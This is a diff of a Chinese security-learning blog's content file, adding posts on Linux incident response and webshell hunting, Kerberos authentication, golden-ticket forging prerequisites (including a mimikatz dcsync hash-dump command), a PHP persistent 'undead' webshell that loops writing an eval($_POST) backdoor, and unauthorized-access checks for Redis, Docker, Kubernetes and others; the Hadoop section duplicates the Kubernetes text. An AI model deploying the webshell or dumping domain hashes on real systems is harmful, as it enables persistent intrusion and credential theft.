@@ -498,11 +498,134 @@
 
 
 
-<h4 id="应急"><a href="#应急" class="headerlink" title="应急"></a>应急</h4><p>直接删，如果是免杀，按照创建时间找，如果改时间，对比哈希值</p>
+<h4 id="应急"><a href="#应急" class="headerlink" title="应急"></a>应急</h4><p><strong>特征</strong>:文件名   找到直接删，  </p>
+<p><strong>时间</strong>：从文件时间入手，去匹配业务日志里面的时间段</p>
+<p><strong>流量</strong>：态势感知</p>
+<p> 如果是免杀，按照创建时间找，如果改时间，对比哈希值</p>
 <p>或者快照，直接回档</p>
-<p>服务</p>
-<p>进程</p>
-<p>注册表</p>
+<h5 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># linux </span></span><br><span class="line"><span class="comment"># messages文件记录了操作系统的所有日志消息,内核，进程，服务</span></span><br><span class="line">/var/log/messages</span><br><span class="line"><span class="comment"># syslog日志文件是另一个记录系统日志的文件，组件和服务的消息，smtp、pop、imap</span></span><br><span class="line">/var/log/syslog</span><br><span class="line"><span class="comment"># auth.log日志记录用户认证、授权访问控制的信息</span></span><br><span class="line">/var/log/auth.log</span><br><span class="line"><span class="comment"># kern.log日志记录所有与系统内核相关的事件和消息，内核故障，驱动程序错误，内核崩溃</span></span><br><span class="line">/var/log/kern.log</span><br><span class="line"><span class="comment"># daemon.log日志记录所有与系统demon相关的事件和消息</span></span><br><span class="line">/var/log/daemon.log</span><br><span class="line"><span class="comment"># boot.log日志记录Linux启动过程中的所有日志消息</span></span><br><span class="line">/var/log/boot.log</span><br><span class="line"><span class="comment"># cron日志记录与定时或循环任务相关的所有消息</span></span><br><span class="line">/var/log/cron</span><br><span class="line"><span class="comment"># dmesg记录了通过系统启动信息输出到终端上，包括设备驱动加载、内存信息、设备探测等</span></span><br><span class="line">/var/log/dmesg</span><br><span class="line"><span class="comment"># maillog用于记录与邮件系统及其相关组件相关的所有消息 pop/imap</span></span><br><span class="line">/var/log/maillog</span><br></pre></td></tr></table></figure>
+
+<p>查找 nginx 访问日志</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>从日志中查找404错误</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo awk <span class="string">&#x27;$9 == 404 || $7 == 404 &#123;print&#125;&#x27;</span> /var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>查找大量出现404错误的IP地址</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo awk <span class="string">&#x27;$9 == 404 || $7 == 404 &#123;print $1&#125;&#x27;</span> /var/log/nginx/access.log | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -rn</span><br></pre></td></tr></table></figure>
+
+<p>防火墙阻止192.168.1.100访问</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo iptables -I INPUT -s 192.168.1.100 -j DROP</span><br></pre></td></tr></table></figure>
+
+<p>查看ssh登录错误日志</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/auth.log</span><br></pre></td></tr></table></figure>
+
+<p>查找错误登录IP地址</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/auth.log | grep <span class="string">&#x27;Failed password&#x27;</span> | awk <span class="string">&#x27; &#123;print $(NF-3)&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -rn</span><br></pre></td></tr></table></figure>
+
+<p>使用 ufw 屏蔽攻击者的 IP   192.168.1.100</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw insert 1 deny from 192.168.1.100 to any</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查看ssh登录成功日志</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/auth.log | grep sshd</span><br></pre></td></tr></table></figure>
+
+<p>出现在日志中的用户都是经过ssh登录的,还可以用grep过滤出失败的登录日志</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/auth.log | grep sshd | grep <span class="string">&#x27;Failed password&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看系统日志，筛选ssh登录记录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/syslog | grep sshd</span><br></pre></td></tr></table></figure>
+
+<p>获取登录者的IP地址，以下命令会显示所有失败的登录尝试并指出攻击者的IP地址</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/auth.log | grep <span class="string">&#x27;sshd.*Failed password&#x27;</span> | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -n</span><br></pre></td></tr></table></figure>
+
+<p>使用netstat 验证获取到的ip是否是攻击者ip</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo netstat -anp | grep &lt;IP address&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="后门排查"><a href="#后门排查" class="headerlink" title="后门排查"></a>后门排查</h5><p>内存马排查</p>
+<p>查找所有java进程</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux | grep java</span><br></pre></td></tr></table></figure>
+
+<p>查看每个java进程的所有者</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -ef | grep java</span><br></pre></td></tr></table></figure>
+
+<p>查看java进程参数</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jps -mlv</span><br></pre></td></tr></table></figure>
+
+<p>查看java进程使用的所有类和包</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jmap -histo &lt;PID&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h5><p>检查网站目录文件，找所有的.php和.sh文件，并且查找eval函数的使用情况</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /var/www/public -<span class="built_in">type</span> f \( -iname <span class="string">&quot;*.php&quot;</span> -or -iname <span class="string">&quot;*.sh&quot;</span> \) -<span class="built_in">exec</span> grep -iRl <span class="string">&quot;eval&quot;</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+
+<p>查找后门</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install chkrootkit rkhunter</span><br><span class="line">sudo chkrootkit</span><br><span class="line">sudo rkhunter --check</span><br></pre></td></tr></table></figure>
+
+<p>查找异常文件，最近被修改过的文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo find / -<span class="built_in">type</span> f -mtime -7 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>查找web服务根目录下比较大的文件和目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">du</span> -ah /var/www/ | grep G</span><br></pre></td></tr></table></figure>
+
+<p>找出对用户可写的文件和目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo find / -xdev -<span class="built_in">type</span> d \( -perm -0002 -a ! -perm -1000 \) -<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
+
+<p>找出可执行文件设置了setuid和setgid权限的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo find / -perm /6000 -type f -exec ls -la &#123;&#125; 2&gt;/dev/null \;</span><br></pre></td></tr></table></figure>
+
+<p>监控网络连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netstat -tnpa | grep ESTABLISHED</span><br></pre></td></tr></table></figure>
+
+<p>看日志文件，wenshell可能被隐藏到日志中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /var/log/auth.log | grep -i sshd</span><br></pre></td></tr></table></figure>
+
+<h5 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h5><p>检查当前环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure>
+
+<p>检查系统环境变量，在&#x2F;etc&#x2F;environment中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /etc/environment</span><br></pre></td></tr></table></figure>
+
+<p>检查shell配置文件，确保每个文件没有添加可疑目录或者路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/.bash_profile、/etc/bash.bashrc、/etc/environment</span><br></pre></td></tr></table></figure>
+
+<p>检查LD_PRELOAD变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $LD_PRELOAD</span><br></pre></td></tr></table></figure>
+
+<h5 id="排查系统异常账户"><a href="#排查系统异常账户" class="headerlink" title="排查系统异常账户"></a>排查系统异常账户</h5><p>查看所有系统账户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>查看root账户信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /etc/passwd | grep &#x27;root&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>检查sudo访问权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<p>查看系统特权账户，linux有一些默认特权用户，wheel、adm、root等，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /etc/group | grep -E &quot;root|adm|lp|wheel&quot;</span><br></pre></td></tr></table></figure>
+
+<p>检查ssh登录日志</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /var/log/auth.log | grep &#x27; sshd&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>检查登录历史</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure>
+
+<h5 id="检查计划任务"><a href="#检查计划任务" class="headerlink" title="检查计划任务"></a>检查计划任务</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ls -alR /etc/cron.*</span><br><span class="line">sudo ls -alR /var/spool/cron/crontabs</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ]]></content>
       <tags>
         <tag>配置</tag>
@@ -649,13 +772,62 @@
       </tags>
   </entry>
   <entry>
-    <title>内网</title>
-    <url>/2023/06/21/%E5%86%85%E7%BD%91/</url>
+    <title>学习计划</title>
+    <url>/2023/06/27/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<p>反序列化入门</p>
+<p><a href="https://blog.csdn.net/weixin_45808483/article/details/122545168">https://blog.csdn.net/weixin_45808483/article/details/122545168</a></p>
+<p><a href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.788.video.desc.click&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.788.video.desc.click&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
+<p>被transient修饰过的变量不能被序列化，因为serialization是吧对象的状态存储到硬盘上，而有些敏感信息，例如银行卡号，是不希望在网络上传输的，transient的作用就是，吧这个变量的生命周期只存在内存中，而不会写到磁盘持久化</p>
+<p>Externalizable接口</p>
+<p>需要重写writeExternal和readExternal方法，它的效率比Serializable高一些，并且可以决定哪些属性需要序列化（即使是transient修饰的），但是对大量对象，或者重复对象，则效率低</p>
+<p>java中自带序列化的类 ， map    hashmap   ，hashmap是重写writeobject和readobject方法的，</p>
+<blockquote>
+<p>序列化是为了让序列化之前和反序列化之后的数据一样，hashmap中，entry的存放位置是key的hash值来计算，然后存放到数组中的，对于同一个key，在不同的jvm中计算出来的hash值可能是不同的，所以需要hashmap重写writeobject和readobject方法</p>
+</blockquote>
+<p>yeoserial构造复杂反序列化链</p>
+<p><a href="https://www.bilibili.com/video/BV115411K7MX/?spm_id_from=333.337.search-card.all.click&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV115411K7MX/?spm_id_from=333.337.search-card.all.click&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
+]]></content>
+      <tags>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kerberos协议</title>
+    <url>/2023/06/21/kerberos%E5%8D%8F%E8%AE%AE/</url>
     <content><![CDATA[<p> <a href="https://blog.csdn.net/zzq060143/article/details/120531735">https://blog.csdn.net/zzq060143/article/details/120531735</a></p>
-<h4 id="windows三大认证"><a href="#windows三大认证" class="headerlink" title="windows三大认证"></a>windows三大认证</h4><p>本地认证 :自己登陆自己电脑</p>
-<p>网络认证:两台电脑之间要访问资源，可以通过网络认证后进行访问</p>
-<h5 id="kerberos-认证-域环境中的认证方式"><a href="#kerberos-认证-域环境中的认证方式" class="headerlink" title="kerberos 认证:域环境中的认证方式"></a>kerberos 认证:域环境中的认证方式</h5><h6 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h6><h6 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h6><h6 id="密钥分发中心KDC-Key-Distribution-Center-而密钥分发中心一般又分为两部分，分别是"><a href="#密钥分发中心KDC-Key-Distribution-Center-而密钥分发中心一般又分为两部分，分别是" class="headerlink" title="密钥分发中心KDC(Key Distribution Center ) 而密钥分发中心一般又分为两部分，分别是"></a>密钥分发中心KDC(Key Distribution Center ) 而密钥分发中心一般又分为两部分，分别是</h6><p>​		AS(Authentication Server):认证服务器，专门用来认证客户端的身份并发放客户用户访问的TGS的TGT(票据授予票据)</p>
+<h4 id="windows三大认证"><a href="#windows三大认证" class="headerlink" title="windows三大认证"></a>windows三大认证</h4><h5 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h5><p>自己登陆自己电脑</p>
+<h5 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h5><p>两台电脑之间要访问资源，可以通过网络认证后进行访问</p>
+<h5 id="kerberos-认证"><a href="#kerberos-认证" class="headerlink" title="kerberos 认证"></a>kerberos 认证</h5><blockquote>
+<p>域环境中的认证方式</p>
+</blockquote>
+<h6 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h6><h6 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h6><h6 id="密钥分发中心"><a href="#密钥分发中心" class="headerlink" title="密钥分发中心"></a>密钥分发中心</h6><p>密钥分发中心KDC(Key Distribution Center ) ，密钥分发中心一般又分为两部分，分别是</p>
+<p>​		AS(Authentication Server):认证服务器，专门用来认证客户端的身份并发放客户用户访问的TGS的TGT(票据授予票据)</p>
 <p>​		TGS(Ticket Granting Server): 票据授予服务器，用来发放整个认证过程以及客户端访问服务端是所系的服务授予票据(Ticket)</p>
+<h6 id="三次通信验证机制"><a href="#三次通信验证机制" class="headerlink" title="三次通信验证机制"></a>三次通信验证机制</h6><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230702024819915.png" alt="image-20230702024819915"></p>
+<p>第一次：客户端请求AS，传递自己的信息给AS</p>
+<p>AS收到请求后，去数据库验证你是否存在，不验证对错，如果存在，AS产生随机的session key，这个key将用于你和TGS的通信</p>
+<p>AS会发送两部分信息给你，一部分是TGT，通过KDC自己的密码加密，另一部分通过你的密码加密，如果你的密码是正确的，你可以解密第二部分信息，获取到TGS session key ,如果密码不正确，无法解密，则认证失败，第一部分是TGT你是无法解密的，需要暂时缓存起来。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请求信息 1</span></span><br><span class="line">name</span><br><span class="line">ip</span><br><span class="line">TGT的有效时间</span><br><span class="line"><span class="comment">#回送信息 2</span></span><br><span class="line">name     KDC 自己的密码加密</span><br><span class="line">ip</span><br><span class="line">TGS name</span><br><span class="line">TGT 生命周期</span><br><span class="line">时间戳</span><br><span class="line">TGS session key</span><br><span class="line"></span><br><span class="line">TGS name   你的密码加密</span><br><span class="line">时间戳</span><br><span class="line">生命周期</span><br><span class="line">TGS session key</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>第二次：如果第一部分你已经成功，那你已经获得无法解密的TGT和TGS session key  ，请求TGS，</p>
+<p>TGS收到信息后，检查数据库中是否包含你请求的http服务名，如果存在，则通过KDC的密码解密TGT，这时，我们就能获取到TGS session key 然后通过TGS session key去解密你传输的第一部分认证器，获取到你的用户名和时间戳，此时TGS在进行验证：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.对比TGT中的用户名与认证器中的用户</span><br><span class="line">2.比较时间戳</span><br><span class="line">3.检查是否过期</span><br><span class="line">4.检查IP地址是否一致</span><br><span class="line">5.检查认证器是否已在TGS缓存中(避免应答攻击)</span><br><span class="line">6.可以在这部分添加权限认证服务</span><br></pre></td></tr></table></figure>
+
+<p>TGS随机产生一个HTTP service session key ，同时准备http service ticket(ST)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请求信息 3</span></span><br><span class="line">name    TGS session key加密</span><br><span class="line">时间戳</span><br><span class="line">请求的服务名</span><br><span class="line">http service 的ticket的生存周期    明文传输</span><br><span class="line"><span class="comment"># 回送信息 4   </span></span><br><span class="line">name      通过http服务的密码加密(ST)</span><br><span class="line">IP</span><br><span class="line">时间戳</span><br><span class="line">http服务name</span><br><span class="line">ST的生命周期</span><br><span class="line">http service session key</span><br><span class="line"></span><br><span class="line">http服务的name   通过TGS session key加密</span><br><span class="line">时间戳</span><br><span class="line">ST的生命周期</span><br><span class="line">http service session key</span><br></pre></td></tr></table></figure>
+
+<p>你收到信息后，通过TGS session key 解密，获取了HTTP session key,但是你无法解密ST</p>
+<p>第三次：前面两步成功后，以后每次获取http服务，在ticket没有过期，或者无更新的情况下，都可以直接进行这一步，省略前面的两个步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 请求信息</span><br><span class="line">name    http service session key加密</span><br><span class="line">时间戳</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>服务端收到后，通过自己的密码解压ST(KDC是http服务的密码加密的)，这样就能够获取到http servicesession key 解密好之后，进行检查</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.对比ST中的用户名，与认证器中的用户名</span><br><span class="line">2.比较时间戳</span><br><span class="line">3.检查是否过期</span><br><span class="line">4.检查IP地址是否一致</span><br><span class="line">5.检查认证器是否已在HTTP服务的缓冲中</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 回答信息</span><br><span class="line">http服务name</span><br><span class="line">时间戳</span><br></pre></td></tr></table></figure>
+
+<p>你通过缓存的http service session key 解密这部分信息，然后验证是否是你想要的服务器发给你的信息，完成验证</p>
 <p>黄金票据: 直接跳过AS ，伪造tgt获得st</p>
 <p>伪造条件:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.域名称  (shell net config workstation)</span><br><span class="line">2.域的SID值(shell whoami /user)</span><br><span class="line">3.域的KRBTGT账号的hash(lsadump::dcsync /domain:tset.cocm /all /csv)</span><br><span class="line">4.伪造任意用户名(随便写)</span><br></pre></td></tr></table></figure>
@@ -670,10 +842,208 @@
 <p>约束性委派</p>
 <p>非约束性委派</p>
 <p>基于资源的约束性委派</p>
+<p><a href="https://www.bilibili.com/video/BV1rV4y1Q7hN/?spm_id_from=333.999.0.0&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV1rV4y1Q7hN/?spm_id_from=333.999.0.0&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
 ]]></content>
       <tags>
         <tag>内网</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>php内存马学习</title>
+    <url>/2023/07/02/php%E5%86%85%E5%AD%98%E9%A9%AC/</url>
+    <content><![CDATA[<p>两种</p>
+<p>1.不死马，直接用代码写一个死循环，不间断写入php shell,或者执行一段代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);<span class="comment">// 设置脚本执行的最大时间限制。将参数设置为0意味着脚本可以无限制地运行，没有时间限制。</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);<span class="comment">// 用户访问完成代码仍然继续运行</span></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);<span class="comment">// 删除当前正在执行的 PHP 文件。__FILE__ 是一个常量，表示当前执行脚本的文件的完整路径和文件名。</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;<span class="comment">// 无限循环</span></span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;test&quot;]) ?&gt;&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="variable">$content</span>);<span class="comment">// 用于将字符串内容写入到文件中</span></span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">10000</span>);<span class="comment">// 让脚本休眠一段时间，以微秒为单位</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>2.fastcgi马，利用php-fpm可以直接通过fastcgi协议通讯的原理，可以指定<code>SCRIPT_FILENAME</code>，去执行机器上存在的 PHP 文件；或者配合<code>auto_prepend_file+php://input</code>，通过每次提交POST code去执行</p>
+<p>PHP 中有两个有趣的配置项，</p>
+<ul>
+<li><code>auto_prepend_file</code>：指定在执行每个php文件之前自动包含的文件。</li>
+<li><code>auto_append_file</code>：用于指定在执行每个php文件之后自动包含的文件</li>
+</ul>
+<p>假设将 <code>auto_prepend_file</code> 设置为 <code>php://input</code>，这就相当于执行任何 PHP 文件前都要包含一遍 POST 的内容。这样的话咱们只需要把PHP代码放在请求里，就会被当作代码被执行。（需要启用远程文件包含选项 <code>allow_url_include</code>）</p>
+<p>第一种木马的查杀方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ignore_user_abort(true);</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        $pid = 353; // php-fpm 进程</span><br><span class="line">        @unlink(&quot;shell.php&quot;);</span><br><span class="line">        exec(&quot;kill -9 $pid&quot;);</span><br><span class="line">        usleep(1000);// 我的剑比你的剑快</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>未授权漏洞收集</title>
+    <url>/2023/06/28/%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
+    <content><![CDATA[<p>默认端口：21, 139, 873, 2049, 2181, 2182, 2375, 5601, 5672, 5900, 5901, 5984, 6379, 6443, 8080, 8088, 8095, 8161, 9100, 9200, 9300, 11211, 15672, 15692, 20048, 25672, 27017</p>
+<h3 id="1-redis未授权"><a href="#1-redis未授权" class="headerlink" title="1.redis未授权"></a>1.redis未授权</h3><blockquote>
+<p>默认端口6379</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>安装Redis，然后连接到服务。</p>
+<p> # yum install redis</p>
+<p># redis-cli -h 10.2.20.73 -p 6379</p>
+<p>10.2.20.73:6379&gt; info</p>
+<h3 id="2-mongodb未授权"><a href="#2-mongodb未授权" class="headerlink" title="2.mongodb未授权"></a>2.mongodb未授权</h3><blockquote>
+<p>默认端口27017</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>安装mongodb，然后连接到服务。</p>
+<p># yum install mongodb</p>
+<p># mongo –host 10.2.20.34 –port 27017</p>
+<p>xxx-test:SECONDARY&gt; show dbs</p>
+<h3 id="3-memcached未授权访问"><a href="#3-memcached未授权访问" class="headerlink" title="3.memcached未授权访问"></a>3.memcached未授权访问</h3><blockquote>
+<p>默认端口11211</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>telnet 10.10.4.89 11211 或 nc -vv <target> 11211</p>
+<p>无需用户名密码，可以直接连接memcache 服务的11211端口</p>
+<p>使用了 stats 命令来输出 Memcached 服务信息</p>
+<h3 id="4-zookeeper未授权"><a href="#4-zookeeper未授权" class="headerlink" title="4.zookeeper未授权"></a>4.zookeeper未授权</h3><blockquote>
+<p>默认端口2181，2182</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>安装ZooKeeper，然后连接到服务。</p>
+<p>ZooKeeper: <a href="https://zookeeper.apache.org/releases.html">https://zookeeper.apache.org/releases.html</a></p>
+<p># wget <a href="https://mirrors.bfsu.edu.cn/apache/zookeeper/zookeeper-3.6.1/apache-zookeeper-3.6.1-bin.tar.gz">https://mirrors.bfsu.edu.cn/apache/zookeeper/zookeeper-3.6.1/apache-zookeeper-3.6.1-bin.tar.gz</a></p>
+<p># tar -xzvf apache-zookeeper-3.6.1-bin.tar.gz</p>
+<p># cd apache-zookeeper-3.6.1-bin&#x2F;bin</p>
+<p># .&#x2F;zkCli.sh -timeout 0 -r -server 10.10.4.72:2181</p>
+<p>备注：windows 下为：zkCli.cmd -timeout 0 -r -server 10.10.4.72:2181</p>
+<h3 id="5-elasticsearch未授权"><a href="#5-elasticsearch未授权" class="headerlink" title="5.elasticsearch未授权"></a>5.elasticsearch未授权</h3><blockquote>
+<p>默认端口 9100，9200，9300</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务</p>
+<p>curl <a href="http://10.2.20.48:9200/">http://10.2.20.48:9200/</a></p>
+<p>curl <a href="http://10.2.20.48:9200/_cat">http://10.2.20.48:9200/_cat</a></p>
+<p>curl <a href="http://10.2.20.48:9200/_cat/_river/_search">http://10.2.20.48:9200/_cat/_river/_search</a></p>
+<p>curl <a href="http://10.2.20.48:9200/cat/indices">http://10.2.20.48:9200/cat/indices</a></p>
+<p><a href="http://10.2.20.48:9100/metrics">http://10.2.20.48:9100/metrics</a></p>
+<h3 id="6-kibana未授权"><a href="#6-kibana未授权" class="headerlink" title="6.kibana未授权"></a>6.kibana未授权</h3><blockquote>
+<p>默认端口5601（最好是直接访问目录，能访问就能shell</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>直接访问kibana的页面，</p>
+<p>如：<a href="https://10.10.4.89:5601/">https://10.10.4.89:5601/</a></p>
+<p><a href="https://10.10.4.89/app/kibana">https://10.10.4.89/app/kibana</a></p>
+<p># <a href="http://10.10.4.89:5601/app/kibana#/">http://10.10.4.89:5601/app/kibana#/</a></p>
+<p>并且无需账号密码可以登录进入界面。</p>
+<h3 id="7-docker-remote-api-未授权访问"><a href="#7-docker-remote-api-未授权访问" class="headerlink" title="7.docker remote api 未授权访问"></a>7.docker remote api 未授权访问</h3><blockquote>
+<p>默认端口2375</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>直接使用浏览器访问：</p>
+<p><a href="http://10.10.4.89:2375/">http://10.10.4.89:2375/</a></p>
+<p><a href="http://10.10.4.89:2375/version">http://10.10.4.89:2375/version</a></p>
+<p><a href="http://10.10.4.89:2375/info">http://10.10.4.89:2375/info</a></p>
+<p>docker -H tcp:&#x2F;&#x2F;192.168.15.5:2375 version</p>
+<p>docker -H tcp:&#x2F;&#x2F;10.10.4.89:2375 images</p>
+<h3 id="8-kubernetes-api-server-未授权访问"><a href="#8-kubernetes-api-server-未授权访问" class="headerlink" title="8.kubernetes api server 未授权访问"></a>8.kubernetes api server 未授权访问</h3><blockquote>
+<p>默认端口 8080，6443</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务</p>
+<p>端口：8080  <a href="http://10.10.4.89:8080/">http://10.10.4.89:8080/</a></p>
+<p>端口：8080： api dashboard： <a href="http://10.10.4.89:8080/ui">http://10.10.4.89:8080/ui</a> </p>
+<p>端口：10250端口是kubelet API的HTTPS端口，通过路径&#x2F;pods获取环境变量、运行的容器信息、命名空间等信息。</p>
+<p><a href="http://10.10.4.89:10250/pods">http://10.10.4.89:10250/pods</a></p>
+<p><a href="http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy">http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy</a></p>
+<p><a href="http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login">http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login</a></p>
+<h3 id="9-hadoop未授权访问"><a href="#9-hadoop未授权访问" class="headerlink" title="9.hadoop未授权访问"></a>9.hadoop未授权访问</h3><blockquote>
+<p>默认端口8088</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>端口：8080  <a href="http://10.10.4.89:8080/">http://10.10.4.89:8080/</a></p>
+<p>端口：8080： api dashboard： <a href="http://10.10.4.89:8080/ui">http://10.10.4.89:8080/ui</a> </p>
+<p>端口：10250端口是kubelet API的HTTPS端口，通过路径&#x2F;pods获取环境变量、运行的容器信息、命名空间等信息。</p>
+<p><a href="http://10.10.4.89:10250/pods">http://10.10.4.89:10250/pods</a></p>
